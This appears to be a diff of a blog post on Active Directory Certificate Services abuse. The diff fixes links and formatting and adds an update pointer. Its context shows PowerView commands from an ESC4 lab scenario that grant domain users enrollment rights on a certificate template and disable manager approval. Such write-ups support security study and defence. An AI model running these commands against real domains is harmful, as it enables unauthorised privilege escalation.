@@ -13,7 +13,7 @@ Prepare yourself for a shitload of pictures, memes, usefull as well as meaningle
 <!--more-->
 # Introduction  
 
-If you have not already done so, go and read the fundamental work which this blog relies on: [Certified Pre-Owned](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf).  
+If you have not already done so, go and read the fundamental work which this blog relies on: [Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf).  
 It is the research from the SpecterOps guys [Will Schroeder](https://twitter.com/harmj0y) and [Lee Christensen](https://twitter.com/tifkin_) in the field of ADCS abuses and their mitigations.  
 
 If you are just here to pwn stuff, you can directly jump to your desired section:  
@@ -366,8 +366,9 @@ Well in this case we can't work with Certify ~~or Certipy~~ (see below update) a
 ```
 # Give users enrollment rights  
 Add-DomainObjectAcl -TargetIdentity ESC4 -PrincipalIdentity "Domänen-Benutzer" -RightsGUID "0e10c968-78fb-11d2-90d4-00c04f79dc55" -TargetSearchBase "LDAP://CN=Configuration,DC=mcafeelab,DC=local" -Verbose  
-<img src="/images/2022-09-16/esc4_enrollset.png">  
-
+```
+<img src="/images/2022-09-16/ESC4_enrollset.png">  
+```
 # Disable manager approval
 Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=mcafeelab,DC=local" -Identity ESC4 -XOR @{'mspki-enrollment-flag'=2} -Verbose
 
@@ -957,6 +958,9 @@ Thx to all the others I forgot to mention, but which's info, tools and writeups 
 
 
 ## All the stuff I used for my "research" in absolutely chaotic order:  
+
+UPDATE 10.11.2022:  
+SpecterOps released a new blog taking several scenarios with abuse cases and MS patchtes into cosideration -> https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d  
 
 https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse/esc1  
 https://github.com/GhostPack/Certify  
